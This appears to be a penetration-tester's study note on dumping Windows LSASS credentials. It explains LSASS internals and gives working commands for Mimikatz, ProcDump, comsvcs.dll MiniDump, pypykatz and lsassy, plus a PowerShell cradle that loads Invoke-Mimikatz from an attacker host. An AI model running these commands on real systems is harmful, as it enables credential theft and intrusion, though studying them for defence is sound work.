---
created: 03-03-2026
tags:
  - Windows
  - password_attacks
  - Windows_credential_dumping
---

>**MITRE ATT&CK:** [`T1003.001 — OS Credential Dumping: LSASS Memory`](https://attack.mitre.org/techniques/T1003/001/).
>**Required privilege:** Local Administrator or `SYSTEM` (for `SeDebugPrivilege`). 
>**Goal:** Extract NTLM hashes, Kerberos tickets, and (sometimes) plaintext passwords from LSASS process memory.

### Table of contents

- [[#Understanding LSA and LSASS]]
- [[#Dumping credentials from LSASS memory]]
	- [[#Live memory analysis with Mimikatz]]
	- [[#Process memory dump + offline analysis]]
		- [[#Acquiring memory dump]]
			- [[#`ProcDump`]]
			- [[#`comsvcs.dll`]]
		- [[#Extracting credentials from a memory dump]]
		- [[#`lsassy`]]
- [[#References and further reading]]
## Understanding LSA and LSASS

>Windows **Local Security Authority (LSA)** is a protected Windows security subsystem responsible for processing authentication requests, enforcing security policies, and managing active sessions on a local Windows host. 

- The LSA itself is not a standalone process but an architectural component spread across multiple DLLs (Dynamic-Link Libraries) that together implement core Windows security services.

>[!note] See [`LSA Authentication Model — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565%28v%3Dws.11%29#lsass-process-memory).

>The **Local Security Authority Subsystem Service (LSASS)** is the *actual process* (`lsass.exe`) that hosts LSA at runtime. 

- LSASS runs as `lsass.exe` under the `SYSTEM` account; it handles *interactive and network logins*, generates and manages *access tokens*, enforces security policies, writes *security audit events to the Windows Security Log*, and so on.
- Importantly, LSASS **integrates with authentication packages like Kerberos and NTLM and handles SSO (Single Sign-On)**.

And because LSASS performs these functions, it necessarily loads and stores authentication material in the process memory. This makes it a common target for credential theft attacks.

>[!interesting]+ Authentication packages
> 
> Windows implements protocol-specific authentication functions in DLLs known as **[Security Support Providers (SSPs)](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture)** or **authentication packages**. These DLLs are loaded into the LSASS process dynamically at system startup or when needed.
> 
> | Package       | DLL            | Credential material                                                  |
> | ------------- | -------------- | -------------------------------------------------------------------- |
> | NTLM (MSV1_0) | `msv1_0.dll`   | NT and LM hashes.                                                    |
> | Kerberos      | `kerberos.dll` | Kerberos Ticket-Granting Tickets (TGTs) and Service Tickets (STs).   |
> | WDigest       | `wdigest.dll`  | Plaintext passwords (legacy; disabled by default on modern Windows). |
> | CredSSP       | `credssp.dll`  | Credentials used for RDP, PowerShell remoting.                       |
> | LiveSSP       | `livessp.dll`  | Microsoft account credentials.                                       |
> | TSPKG         | `tspkg.dll`    | Terminal Services credentials.                                       |
> 

Credentials LSASS stores in memory typically include:
- **[[NTLM_|NTLM]] password hashes (NT hashes)** — used in NTLM challenge/response flows.
- **[[how_Kerberos_works|Kerberos]] tickets (TGTs, STs)** — used for domain authentication and SSO.
- **DPAPI (Data Protection API) keys** — used to encrypt and decrypt user or system data (e.g., saved passwords in browsers, email account passwords, Wi-Fi and VPN credentials, etc.).
- Occasionally **plaintext credentials**, depending on SSPs (e.g., legacy WDigest).

>[!interesting]- SSO and the need to keep credentials in LSASS memory
> Windows is designed to natively support **Single Sign-On (SSO)**. Once you authenticate, you don't have to keep re-entering credentials each time you want to access resources.
> For this to work, the LSASS needs to store credential material in memory so it can re-prove your identity to other services on your behalf. This is the primary reason why LSASS needs all these credentials in memory.

>[!interesting]- WDigest
> **WDigest** is a legacy Windows authentication protocol that stores user passwords in plaintext in LSASS memory. The package was enabled by default in Windows XP through Windows 8 and Windows Server 2012 R2; it's disabled on modern systems but can still be re-enabled via registry. 
> - When WDigest is active, `sekurlsa::logonpasswords` will return plaintext passwords rather than NT hashes.
> - With WDigest off, you'll get NT hashes and cached Kerberos tickets.

>[!note] See [`Cached and Stored Credentials Technical Overview — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565%28v%3Dws.11%29).

## Dumping credentials from LSASS memory

To read another process’s memory on Windows, you normally need the **`SeDebugPrivilege`** right. By default, this privilege is held only by local Administrators (members of the `Administrators` group) and `SYSTEM`. 

>[!tip]+
>- Check your current privileges:
>```powershell
>whoami /priv
>```


In practice, extracting credentials from LSASS memory follows one of these two scenarios:
- **Live memory analysis**
- **LSASS process memory dump + offline analysis** 

A summary of tools:
- [`lsassy`](https://github.com/login-securite/lsassy)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [`pypykatz`](https://github.com/skelsec/pypykatz)
- [`ProcDump`](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) (from [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/))
- `comsvcs.dll`
- [`PowerSploit`](https://github.com/PowerShellMafia/PowerSploit)'s [`Invoke-Mimikatz.ps1`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)


### Live memory analysis with Mimikatz

To extract credentials from a running LSASS process, you need a shell on the target with appropriate privileges. You can use [Mimikatz](https://github.com/gentilkiwi/mimikatz) for this purpose. 

- The `privilege::debug` module requests `SeDebugPrivilege`:

```powershell
privilege::debug
```

- The `sekurlsa::logonpasswords` module extracts all credentials from the LSASS process's memory it can find, including NTLM hashes, Kerberos tickets, and plaintext passwords:

```powershell
sekurlsa::logonpasswords
```

>[!interesting] Internally, `sekurlsa::logonpasswords` opens a handle to the LSASS process using Win32 API ([`OpenProcess()`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)), then scans the process's memory for known structured loaded by security packages (e.g., `MSV1_0`, `Kerberos`, `WDigest`), decodes them, and renders in PowerShell.

>[!example]+
>![[mimikatz2.png]]

>[!warning] Live memory analysis is often nosier in terms of defensive telemetry.

There's also [`PowerSploit`](https://github.com/PowerShellMafia/PowerSploit)'s [`Invoke-Mimikatz.ps1`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) that **loads Mimikatz 2.0 in PowerShell memory**. It can be used to dump credentials without writing anything to disk:

```bash
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://<attacker_ip_address>/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```

>[!interesting] Under the hood, `Invoke-Mimikarz.ps1` uses reflective [PE injection](https://attack.mitre.org/techniques/T1055/002/) to load the Mimikatz DLL into the PowerShell process (doesn't touch the disk), and then runs the same `sekurlsa::` modules that a standalone Mimikatz executable would.
### Process memory dump + offline analysis

Instead of scanning live LSASS memory, you can capture a process memory dump and parse it offline. This approach can be less noisy, and comes useful when in-memory access is blocked by defenses.

- To create an LSASS process's memory dump, you can use native Windows tools like [`ProcDump`](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) (from [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/)), the `comsvcs.dll` DLL, or even Task Manager (if you have GUI access via RDP, for example).
- To analyze the acquired dump, you can use [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `sekurlsa::minidump` module or [`pypykatz`](https://github.com/skelsec/pypykatz).
- With the [`lsassy`](https://github.com/login-securite/lsassy) tool, you can complete these two steps in one command.
#### Acquiring memory dump

>[!tip]+
> Before you can get a memory dump, you need the LSASS process ID (PID). To get it, run:
> 
> ```powershell
> tasklist /fi "imagename eq lsass.exe"
> ```
> 

##### `ProcDump`

[`ProcDump`](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) (from [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/)) is designed for creating process dumps for debugging, and can as well be used to dump LSASS process's memory:

```powershell
procdump -accepteula -ma <LSASS_PID> lsass.dmp
```

- The `-ma` flag requests a _full_ minidump (not just exception-related regions).
- The `-accepteula` flag suppresses the EULA dialog; required for non-interactive sessions.

>[!note] You can download `ProcDump.exe` from [`live.sysinternals.com`](https://live.sysinternals.com/).

>[!note]+ `ProcDump` is a signed Microsoft library, so it's less likely to be flagged by AV or EDRs than a Mimikatz binary.
>
##### `comsvcs.dll`

`comsvcs.dll` is a legitimate Windows system DLL located at `C:\Windows\system32\comsvcs.dll`. It's part of COM+ Component Service and ships with every Windows installation.
The DLL has a function called **`MiniDump`** (ordinal 24), which can be used to create a [minidump of a process's memory](https://docs.datadoghq.com/security/default_rules/def-000-zzz/) .

>[!note] `MiniDump` wraps the [`MiniDumpWriteDump()`](https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump) Windows API.

- You can run DLLs directly using the [`rundll32`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32) command:

```powershell
rundll32 C:\Windows\system32\comsvcs.dll MiniDump <LSASS_PID> lsass.dmp full
```

>[!tip]+
>- Find LSASS PID:
>```powershell
>tasklist /fi "imagename eq lsass.exe"
>```


>[!tip]+
>One more way to create a process's memory dump in Windows is using Task Manager -> `Create Dump File`.
### Extracting credentials from a memory dump 

To analyze the acquired dump right on the target machine, you can use [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `sekurlsa::minidump` module:

```
sekurlsa::minidump lsass.dmp
```

Or, you can transfer the dump to your attacker box and analyse it using the [`pypykatz`](https://github.com/skelsec/pypykatz) Python library:

```bash
pypykatz lsa minidump lsass.dmp
```

>[!note]+ Installation
> ```bash
> pip3 install pypykatz
> ```

### `lsassy`

>[`lsassy`](https://github.com/login-securite/lsassy) is a Python tool that can remotely extract credentials from multiple Windows hosts.

- `lsassy` first connects to the target host using credentials you supply and creates a dump of LSASS memory on the remote host, for which it uses [`Impacket`](https://github.com/SecureAuthCorp/impacket).
- It then fetches the dump back to your machine and extracts credentials using [`pypykatz`](https://github.com/skelsec/pypykatz).

So, `lsassy` is a new method but rather a wrapper, an automation of existing tools. 

>[!note]+ Installation
>```bash
>python3 -m pip install lsassy
>```

- Connect to the target host using a plaintext password to get an LSASS memory dump:

```bash
lsassy -d <domain> -u <user> -p <password> <targets>
```

- Authenticate with [[Pass-the-Hash]] (NTLM):

```bash
lsassy -u <user> -H <NT_hash> <targets>
```

- With [[Pass-the-Ticket]] (Kerberos):

```bash
lsassy -k <targets>
```

## References and further reading

- [`LSA Authentication Model — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/secauthn/lsa-authentication-model)
- [`Cached and Stored Credentials Technical Overview — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565%28v%3Dws.11%29)
- [`LSASS secrets — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/credentials/dumping/lsass)
- [`OS Credential Dupming: LSASS Memory — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1003/001/)
- [`LSASS Memory — garnet`](https://mitre.garnet.ai/mitre/mitre/ta0006/t1003/t1003.001)
